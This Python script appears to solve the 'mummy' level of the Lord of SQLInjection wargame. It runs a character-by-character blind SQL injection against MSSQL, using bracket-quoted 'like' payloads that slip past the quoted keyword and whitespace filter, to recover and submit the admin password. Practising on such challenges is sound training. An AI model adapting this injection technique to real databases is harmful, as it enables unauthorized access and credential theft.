#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'Hello anonymous' in args[0]


def find_pw(pw, p):
    for i in range(48, 128):
        payload = "*from[prob_mummy]where[id]='admin'and[pw]like'%s'"
        param = dict(query=payload % (pw + chr(i) + '%'))
        p.payload = param['query']
        response = p.my_request()
        print('')
        if check_func(response):
            return chr(i)


def main():
    """
    Mummy 44 Blind Injection

    if(preg_match('/master|sys|information|;|\(|\//i', $_GET['query'])) exit("No Hack ~_~");
    for($i=0;$i<strlen($_GET['query']);$i++) if(ord($_GET['query'][$i]) <= 32) exit("%01~%20 can used as whitespace at mssql");
    $query = "select".$_GET['query'];
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result[0]) echo "<h2>Hello anonymous</h2>";

    $query = "select pw from prob_mummy where id='admin'";
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['pw'] === $_GET['pw']) solve("mummy");
    """

    url = "https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'query'

    p = los.SqlInjection(url, cook, method, inj_param, '')

    result = ''
    while True:
        try:
            result += find_pw(result, p)
            print('result', result)
        except:
            break

    p.payload = result.lower()
    p.inj_param = 'pw'
    response = p.my_request()
    if 'Clear!' in response:
        print('\nMummy Clear!')


if __name__ == '__main__':
    main()
